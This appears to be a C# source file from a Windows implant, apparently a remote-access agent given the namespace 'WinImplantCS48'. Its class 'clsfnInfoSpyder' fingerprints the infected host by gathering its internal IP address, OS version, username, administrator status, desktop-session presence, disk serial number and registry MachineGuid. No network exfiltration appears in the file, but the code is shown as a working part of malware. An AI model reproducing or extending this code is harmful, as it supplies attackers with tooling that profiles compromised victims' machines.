using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Data;
using System.Security.Principal;

namespace WinImplantCS48
{
    public class clsfnInfoSpyder
    {
        public struct stInfo
        {
            public uint m_nUid;
            public string m_szIPv4;
            public string m_szOSName;
            public string m_szUsername;
            public string m_szUname;
            public string m_szMachineID;
            public bool m_bIsRoot;
            public bool m_bHasDesktop;

            public stInfo(uint uid, string szIPv4, string szOSName, string szUsername, string szUname, string szMachineID, bool bIsRoot, bool bHasDesktop)
            {
                m_nUid = uid;
                m_szIPv4 = szIPv4;
                m_szOSName = szOSName;
                m_szUsername = szUsername;
                m_szUname = szUname;
                m_szMachineID = szMachineID;
                m_bIsRoot = bIsRoot;
                m_bHasDesktop = bHasDesktop;
            }
        }

        public stInfo m_info;

        public clsfnInfoSpyder()
        {
            uint uid = (uint)Environment.UserDomainName.GetHashCode();  // Windows: Get the user UID via hash, fallback for demonstration.
            string szIPv4 = fnszGetInternalIPv4();
            string szOsName = fnszGetOSName();
            string szUsername = fnszUsernameFromUid(uid);
            string szUname = fnszUnameInfo();
            string szMachineID = fnszReadMachineId();
            bool bIsRoot = fnbIsAdmin();
            bool bHasDesktop = fnbHasDesktopSession();

            m_info = new stInfo(uid, szIPv4, szOsName, szUsername, szUname, szMachineID, bIsRoot, bHasDesktop);
        }

        private bool fnbIsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public string fnszReadFileTrim(string szFilePath)
        {
            if (!File.Exists(szFilePath)) return "";

            string s = File.ReadAllText(szFilePath).Trim();
            return s;
        }

        public string fnszGetOSName()
        {
            // Windows OS name
            return Environment.OSVersion.ToString();
        }

        public string fnszUnameInfo()
        {
            // For Windows, uname info is not directly accessible. We'll use Windows-specific information.
            return $"{Environment.OSVersion.Platform} {Environment.OSVersion.Version} {Environment.Is64BitOperatingSystem}";
        }

        public string fnszUsernameFromUid(uint uid)
        {
            try
            {
                // In Windows, the user name can be obtained from the Environment class.
                return Environment.UserName;
            }
            catch
            {
                return "";
            }
        }

        public string fnszReadMachineId()
        {
            DataTable dt = clsTools.fnWmiQuery("select serialnumber from win32_diskdrive");
            string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();

            return szSerialNumber;
        }

        public bool fnbHasDesktopSession()
        {
            // On Windows, check for a desktop session by detecting the "Desktop" environment.
            return !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("SESSIONNAME"));
        }

        public string fnszGetInternalIPv4()
        {
            try
            {
                // Get local IPv4 address using Dns.GetHostEntry
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ipAddress = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                return ipAddress?.ToString() ?? "[UNKNOWN]";
            }
            catch
            {
                return "[UNKNOWN]";
            }
        }

        private string fnGetMachineGuid()
        {
            // Get the machine GUID for Windows
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
            {
                if (key != null)
                {
                    object obj = key.GetValue("MachineGuid");
                    return obj != null ? obj.ToString() : string.Empty;
                }
            }
            return string.Empty;
        }
    }
}
